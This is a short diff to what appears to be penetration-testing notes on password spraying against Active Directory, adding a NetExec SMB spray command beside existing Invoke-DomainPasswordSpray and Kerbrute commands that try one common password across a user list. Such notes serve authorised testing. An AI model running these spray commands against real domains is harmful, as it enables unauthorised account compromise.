@@ -48,6 +48,9 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 
 # using Kerbrute.exe
 .\kerbrute_Windows.exe passwordspray -d <DOMAIN_NAME> .\userlist.txt Welcome1 --dc <DC_IP> --output spray_success.txt
+
+# using NetExec
+nxc smb <DC-IP> -u valid_users.txt -p Password123 --continue-on-success
 ```
 
 ## External Password Spraying
